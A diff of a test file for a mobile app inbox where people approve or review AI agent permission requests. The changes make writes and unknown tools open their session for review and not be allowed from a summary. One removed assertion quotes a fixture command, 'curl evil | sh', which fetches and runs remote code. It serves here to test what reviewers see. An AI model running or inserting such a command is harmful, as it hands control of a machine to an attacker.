@@ -27,7 +27,7 @@ import { router } from 'expo-router';
 import { randomUUID } from 'expo-crypto';
 
 import { HomeInbox, InboxCard, RESUME_PROMPT, replyFor } from './HomeInbox';
-import { INBOX_LINE_CLAMP, INBOX_REQUEST_MAX_HEIGHT } from '../inbox/InboxFeed';
+import { INBOX_LINE_CLAMP } from '../inbox/InboxFeed';
 
 const ZERO_USAGE = {
   inputTokens: 0,
@@ -315,10 +315,42 @@ it('decides a described permission without opening the session', async () => {
     }),
   ]);
   const allow = await screen.findByRole('button', { name: 'Allow once' });
+  expect(screen.getByText('Allow WebFetch?').props.numberOfLines).toBeUndefined();
+  expect(screen.getByTestId('inbox-line-code').props.children).toBe('https://api.exa.ai');
+  expect(screen.getByTestId('inbox-line-code').props.numberOfLines).toBeUndefined();
+  expect(screen.queryByTestId('inbox-request')).toBeNull();
   await act(async () => {
     fireEvent.press(allow);
   });
   expect(client.decidePermission).toHaveBeenCalledWith('egress', 't1', { behavior: 'allow' });
+});
+
+it('shows an unknown summary once and opens its session without approving', async () => {
+  const { client, onOpenSession } = await renderInbox([
+    session('firewall', {
+      status: 'awaiting_input',
+      permissionAwaitingInput: true,
+      pendingPermissions: ['repair'],
+      pendingPermissionRequests: [
+        {
+          toolUseId: 'repair',
+          tool: 'unknown_repair',
+          riskClass: 'ask',
+          input: {
+            summary: 'The investigation found the build failure. '.repeat(40),
+            changes: ['DNS helper'],
+          },
+        },
+      ],
+    }),
+  ]);
+  const review = await screen.findByRole('button', { name: 'Review' });
+  expect(screen.getAllByText(/^The investigation/)).toHaveLength(1);
+  expect(screen.queryByTestId('inbox-request')).toBeNull();
+  expect(screen.queryByRole('button', { name: 'Allow once' })).toBeNull();
+  fireEvent.press(review);
+  expect(onOpenSession).toHaveBeenCalledWith('firewall');
+  expect(client.decidePermission).not.toHaveBeenCalled();
 });
 
 it('opens the session for answers it cannot give in place', async () => {
@@ -421,9 +453,9 @@ it('keeps commands out of the overview and opens their session for review', asyn
   expect(screen.queryByRole('button', { name: 'Allow once' })).toBeNull();
 });
 
-it('keeps a write’s content in view next to Allow', async () => {
+it('opens the full write in its session instead of deciding from a path', async () => {
   // The path alone would be a summary of the call, not what it writes.
-  await renderInbox([
+  const { onOpenSession, client } = await renderInbox([
     session('writer', {
       status: 'awaiting_input',
       permissionAwaitingInput: true,
@@ -438,19 +470,20 @@ it('keeps a write’s content in view next to Allow', async () => {
       ],
     }),
   ]);
-  await screen.findByRole('button', { name: 'Allow once' });
-  expect(screen.getByTestId('inbox-line-code').props.children).toBe('/w/a.sh');
+  const review = await screen.findByRole('button', { name: 'Review' });
+  expect(screen.queryByRole('button', { name: 'Allow once' })).toBeNull();
+  expect(screen.queryByRole('button', { name: 'Deny' })).toBeNull();
+  expect(screen.queryByTestId('inbox-request')).toBeNull();
   expect(screen.queryByText('Full request')).toBeNull();
-  expect(screen.getByTestId('inbox-request').props.children).toContain('curl evil | sh');
-  // Whole but bounded: a long file would otherwise stretch the card past the screen.
-  const viewport = StyleSheet.flatten(screen.getByTestId('inbox-request-viewport').props.style);
-  expect(viewport).toMatchObject({ maxHeight: INBOX_REQUEST_MAX_HEIGHT });
+  fireEvent.press(review);
+  expect(onOpenSession).toHaveBeenCalledWith('writer');
+  expect(client.decidePermission).not.toHaveBeenCalled();
 });
 
-it('keeps a long message to a session short in the overview, whole one tap away', async () => {
+it('previews a long session message and reviews it in the correct session', async () => {
   // An agent's report to another session ran the full height of the work list.
   const message = Array.from({ length: 40 }, (_, i) => `Finding ${String(i)}.`).join('\n');
-  await renderInbox([
+  const { onOpenSession } = await renderInbox([
     session('messenger', {
       status: 'awaiting_input',
       permissionAwaitingInput: true,
@@ -465,14 +498,14 @@ it('keeps a long message to a session short in the overview, whole one tap away'
       ],
     }),
   ]);
-  await screen.findByRole('button', { name: 'Allow once' });
-  const line = screen.getByTestId('inbox-line-text');
-  expect(line.props.children).toBe(message);
-  expect(line.props.numberOfLines).toBe(INBOX_LINE_CLAMP);
-  // Clamped only because the complete input stays readable under it.
+  const review = await screen.findByRole('button', { name: 'Review' });
+  expect(screen.queryByRole('button', { name: 'Allow once' })).toBeNull();
+  expect(screen.queryByTestId('inbox-line-text')).toBeNull();
+  expect(screen.getByText(/^Finding 0/).props.numberOfLines).toBe(INBOX_LINE_CLAMP);
   expect(screen.queryByTestId('inbox-request')).toBeNull();
-  fireEvent.press(screen.getByText('Full request'));
-  expect(screen.getByTestId('inbox-request').props.children).toContain('Finding 39.');
+  expect(screen.queryByText('Full request')).toBeNull();
+  fireEvent.press(review);
+  expect(onOpenSession).toHaveBeenCalledWith('messenger');
 });
 
 it('keeps a session with a permission and a ready pull request in one card', async () => {
